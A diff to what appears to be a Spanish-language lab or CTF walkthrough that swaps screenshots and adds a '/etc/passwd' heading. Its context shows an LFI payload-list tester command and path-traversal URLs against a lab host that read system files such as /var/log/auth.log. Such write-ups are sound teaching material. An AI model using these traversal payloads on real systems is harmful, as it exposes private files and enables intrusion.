@@ -67,7 +67,7 @@ LFI Payloads: https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/mast
 ```
 python3 LFITester.py -L payloads.txt
 ```
-![8](https://user-images.githubusercontent.com/75953873/174933626-66285afb-399e-4266-9317-9f0beccbda36.png)
+![9](https://user-images.githubusercontent.com/75953873/174938168-ec6ee35f-6eaf-4d05-937a-ada4e7db7e84.png)
 
 URL: 
 ```
@@ -75,5 +75,7 @@ Opción 1) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../..
 Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log
 ```
 
-![9](https://user-images.githubusercontent.com/75953873/174938168-ec6ee35f-6eaf-4d05-937a-ada4e7db7e84.png)
+**/etc/passwd**
+
+![8](https://user-images.githubusercontent.com/75953873/174938610-b5e9c773-26e3-443a-aa47-2b06bf6a1ee5.png)
 
